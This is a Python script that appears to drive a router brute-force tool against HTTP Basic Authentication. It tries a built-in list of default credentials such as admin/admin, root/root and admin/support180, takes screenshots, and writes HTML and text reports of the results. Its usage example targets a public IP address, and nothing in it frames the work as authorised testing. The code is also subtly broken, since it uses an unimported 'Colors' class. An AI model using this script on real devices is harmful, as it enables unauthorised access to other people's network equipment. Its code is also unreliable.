#!/usr/bin/env python3
"""
Test HTTP Basic Authentication specifically
"""

import sys
import os
from router_brute_force_chrome import ChromeRouterBruteForce

def test_basic_auth(url):
    """Test HTTP Basic Authentication"""
    print(f"Testing HTTP Basic Auth: {url}")
    print("=" * 60)
    
    # Create brute force instance with limited credentials for testing
    test_credentials = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", "support180"),
        ("admin", ""),
        ("root", "root"),
        ("root", "admin"),
        ("root", "password"),
        ("root", "1234"),
        ("root", ""),
        ("administrator", "administrator"),
        ("administrator", "admin"),
        ("administrator", "password"),
        ("administrator", "1234"),
        ("administrator", ""),
    ]
    
    # Override the credentials for testing
    import router_brute_force_chrome
    original_credentials = router_brute_force_chrome.TARGET_CREDENTIALS
    router_brute_force_chrome.TARGET_CREDENTIALS = test_credentials
    
    try:
        # Create brute force instance
        brute_force = ChromeRouterBruteForce([url], threads=1, timeout=30, headless=False, enable_screenshot=True)
        
        # Run brute force
        results = brute_force.run_brute_force()
        
        # Generate reports
        if results:
            print(f"\n{Colors.CYAN}[*] Generating reports...{Colors.END}")
            html_report = brute_force.generate_html_report(results)
            txt_report = brute_force.generate_txt_report(results)
            
            if html_report and txt_report:
                print(f"{Colors.GREEN}[+] Reports generated successfully:{Colors.END}")
                print(f"  - HTML Report: {Colors.CYAN}{html_report}{Colors.END}")
                print(f"  - TXT Report: {Colors.CYAN}{txt_report}{Colors.END}")
        
        return results
        
    finally:
        # Restore original credentials
        router_brute_force_chrome.TARGET_CREDENTIALS = original_credentials

def main():
    if len(sys.argv) != 2:
        print("Usage: python test_basic_auth.py <URL>")
        print("Example: python test_basic_auth.py http://111.220.143.231/")
        sys.exit(1)
    
    url = sys.argv[1]
    results = test_basic_auth(url)
    
    if results:
        print(f"\n{Colors.GREEN}[+] Test completed successfully!{Colors.END}")
    else:
        print(f"\n{Colors.RED}[!] Test failed!{Colors.END}")

if __name__ == "__main__":
    main()